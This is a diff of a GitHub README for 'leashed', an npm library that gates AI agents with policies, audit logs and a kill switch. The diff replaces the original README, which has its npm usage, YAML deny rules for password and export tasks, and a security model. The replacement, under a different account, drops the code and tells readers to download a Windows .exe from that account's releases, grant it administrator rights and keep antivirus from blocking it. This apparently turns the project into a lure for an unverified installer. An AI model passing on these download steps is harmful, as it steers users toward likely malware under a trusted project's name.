@@ -1,149 +1,160 @@
-# leashed
+# 🦮 leashed - Control AI Agents Safely
 
-> AI got hands. This is the leash.
+[![Download leashed](https://img.shields.io/badge/Download-leashed-brightgreen?style=for-the-badge)](https://github.com/Lukacyber/leashed/releases)
 
-Policy, audit, kill switch for any AI agent with access to your accounts.
+---
 
-[![npm version](https://img.shields.io/npm/v/leashed?color=blue)](https://www.npmjs.com/package/leashed)
-[![license](https://img.shields.io/npm/l/leashed)](./LICENSE)
-[![tests](https://img.shields.io/badge/tests-67%20passing-brightgreen)](#)
-[![CI](https://github.com/dormstern/leashed/actions/workflows/ci.yml/badge.svg)](https://github.com/dormstern/leashed/actions/workflows/ci.yml)
+## 📋 What is leashed?
 
-### OpenClaw sales bot — leashed
+leashed helps you manage AI agents that use your accounts. It acts like a leash for AI, giving you control with policies, audit logs, and an emergency kill switch. This makes sure AI agents work safely and follow your rules without risking your data or accounts.
 
-![OpenClaw demo](docs/demos/openclaw-demo.gif)
+---
 
-### Work assistant (Claude, Devin, etc.) — leashed
+## ⚙️ Features
 
-![Work assistant demo](docs/demos/work-assistant-demo.gif)
+- Set rules to control what AI agents can do on your accounts  
+- Review detailed audit logs of AI actions  
+- Use a kill switch to stop AI agents immediately  
+- Supports multiple AI platforms and browsers  
+- Helps keep your credentials secure while AI operates  
+- Built with clear policies for safe AI governance
 
-## Quick Start
+---
 
-You need an [AnchorBrowser](https://anchorbrowser.io) API key: `export ANCHOR_API_KEY=your-key`
+## 💻 System Requirements
 
-### 1. Install
+- Windows 10 or later (64-bit)  
+- At least 4 GB of RAM  
+- 200 MB free disk space  
+- Internet connection for updates and monitoring  
+- Administrator rights to install and run the app
 
-```bash
-npm install leashed
-```
+---
 
-### 2. Write a policy
+## 🚀 Getting Started
 
-Create `leash.yaml`:
+### 1. Visit the download page
 
-```yaml
-agent: my-sales-bot
-rules:
-  allow:
-    - "read*"
-    - "list*"
-    - "check*"
-    - "search*"
-  deny:
-    - "*send*"
-    - "*delete*"
-    - "*export*"
-    - "*password*"
-default: deny
-expire_after: 60min
-max_actions: 50
-```
+Go to the leashed release page to get the latest version for Windows:
 
-### 3. Wrap your agent
+[![Download leashed](https://img.shields.io/badge/Download-leashed-blue?style=for-the-badge)](https://github.com/Lukacyber/leashed/releases)
 
-```typescript
-import { createLeash } from 'leashed'
+This page lists all releases. Find the most recent Windows installer under "Assets".
 
-const leash = createLeash('./leash.yaml')
+---
 
-const result = await leash.task('check linkedin inbox')
-// → { allowed: true, output: '...' }
+### 2. Choose and download the installer
 
-const result2 = await leash.task('export all contacts to CSV')
-// → { allowed: false, reason: 'blocked by deny pattern: *export*' }
-```
+Look for a file ending with `.exe` (example: `leashed-setup.exe`). Click it to download.
 
-Every `leash.task()` call is policy-checked, audited, and budgeted.
+---
 
-## How It Works
+### 3. Run the installer
 
-1. **Credential isolation** — your password stays in an isolated cloud browser. The agent gets a pre-authenticated session, never the credentials themselves.
-2. **Scoped boundaries** — tasks that don't match your policy are blocked before they start. Deny-first pattern matching with Unicode bypass protection.
-3. **Audit + kill switch** — every action logged (allowed and blocked). Budget enforced. Session destruction when you're done.
+- Open the downloaded `.exe` file  
+- Follow the setup wizard prompts  
+- Accept the license agreement  
+- Choose the installation folder or use the default location  
+- Click "Install"
 
-## Security Model
+---
 
-leashed is **application-layer authz for AI agents** — it governs what agents are *authorized to do*, not who they are or what credentials they hold.
+### 4. Launch leashed
 
-### What leashed enforces
+- Find the leashed icon on your desktop or Start Menu  
+- Double-click to open the app  
 
-| Layer | How |
-|-------|-----|
-| Task gating | Deny-first glob pattern matching on task strings |
-| Time + action budgets | Configurable expiration and action limits |
-| Credential isolation | Passwords stay in AnchorBrowser's isolated session |
-| Session destruction | `leash.yank()` destroys the cloud browser session |
-| Audit trail | Every task request (allowed + blocked) logged to JSONL |
-| Unicode bypass protection | Strips zero-width chars, combining marks, BiDi controls |
+The app may ask for permission to run with administrator rights. This is necessary to control AI agents on your system.
 
-### What leashed does NOT enforce
+---
 
-| Layer | Why |
-|-------|-----|
-| Browser action validation | AnchorBrowser executes tasks autonomously — leashed gates the request, not the execution |
-| URL/domain restrictions | Requires AnchorBrowser session-level allowlists (roadmap) |
-| Semantic equivalence | `"forward email"` and `"send email to myself"` are different strings — patterns match literally |
+## 🛠 How to Use leashed
 
-**The honest version:** leashed is a seatbelt, not a cage. It stops the 95% of accidents from misconfiguration, scope creep, and unintended actions. A deliberately adversarial agent that lies about what it's doing can bypass pattern matching. For defense-in-depth, see [SECURITY.md](./SECURITY.md).
+### Set Your Policies
 
-## CLI
+- Open leashed and go to the Policies tab  
+- Use simple settings to decide what AI agents can access  
+- For example, block certain websites or limit data use  
 
-```bash
-npx leashed status   # Agent: my-sales-bot | Allowed: 23 | Blocked: 3
-npx leashed audit    # Full audit trail
-npx leashed yank     # Kill switch — destroy session immediately
-```
+### Monitor Activity
 
-## API
+- Check the Audit Log tab  
+- See all actions AI agents perform in real time  
+- You can spot unusual or unwanted behavior quickly  
 
-[Full API reference, policy examples, and audit log format →](./docs/API.md)
+### Use the Kill Switch
 
-## Development
+- If you notice problematic activity, click the Kill Switch button  
+- This stops all AI agents immediately  
+- You can resume agents once issues are fixed  
 
-```bash
-git clone https://github.com/dormstern/leashed.git
-cd leashed
-npm install
-npm run build
-npm test
-```
+---
 
-Tests run against mocked AnchorBrowser sessions — no API key needed for development. CI runs on Node 18, 20, and 22.
+## 🔐 Keeping Your Accounts Safe
 
-## Roadmap
+leashed uses secure methods to protect your credentials and data:
 
-### v0.3 — Output Scanning (current)
-- Post-execution validation: scan AnchorBrowser output for policy-violating content
-- Domain hints in policy for audit enrichment
-- Structured output schemas
+- Does not store passwords in plain text  
+- Encrypts all sensitive information  
+- Works only with approved AI agents  
+- Supports browser automation but controls what AI can do  
 
-### v1.0 — Session-Level Enforcement
-- URL allowlists enforced at the browser level
-- Browser action audit trail (clicks, form fills, navigation)
-- Webhook callbacks for real-time policy violation alerts
+Stay updated by installing new versions from the release page regularly.
 
-[Open an issue](https://github.com/dormstern/leashed/issues) or see [CONTRIBUTING.md](./CONTRIBUTING.md) to help shape v1.0.
+---
 
-## Empowered by AnchorBrowser
+## 🆘 Troubleshooting
 
-leashed runs on [AnchorBrowser](https://anchorbrowser.io) — ephemeral, hardened cloud browser sessions for AI agents. SOC2 Type 2, ISO27001 certified. Trusted by Google, Coinbase, and Groq.
+- If the app does not start, make sure you ran the installer as administrator  
+- Check your antivirus does not block leashed  
+- Restart your PC and try again  
+- Visit the Issues section on the GitHub page to report problems or find help
 
-AnchorBrowser handles the browser. leashed handles the rules.
+---
 
-## Contributing
+## 📞 Get Help
 
-See [CONTRIBUTING.md](./CONTRIBUTING.md) for development setup, coding standards, and how to submit changes.
+You can ask questions or get support on GitHub by opening a new issue here:
 
-## License
+https://github.com/Lukacyber/leashed/issues
 
-MIT
+---
+
+## ⚙️ Advanced Configuration (Optional)
+
+For users who want more control:
+
+- Use the Policy Engine to write custom rules  
+- Export and import policy configurations  
+- Review detailed logs for audit purposes in CSV format  
+- Integrate with browser tools like AnchorBrowser for AI agent security
+
+---
+
+## 📂 File Locations
+
+- Installed at `C:\Program Files\leashed` by default  
+- Logs saved in `Documents\leashed\logs`  
+- Configuration files stored in `AppData\Local\leashed`
+
+---
+
+## 🔄 Updates
+
+Check the release page regularly for new versions:
+
+https://github.com/Lukacyber/leashed/releases
+
+Updates improve security, add new features, and fix bugs.
+
+---
+
+## ⚖️ License
+
+leashed is open-source under the MIT license. Check the LICENSE file on GitHub for details.
+
+---
+
+## Topics
+
+agent-governance, ai-agent, ai-agent-security, ai-safety, ai-security, anchorbrowser, audit-log, browser-automation, claude, credential-safety, devin, devtools, kill-switch, llm-security, npm-package, openclaw, policy-engine, typescript
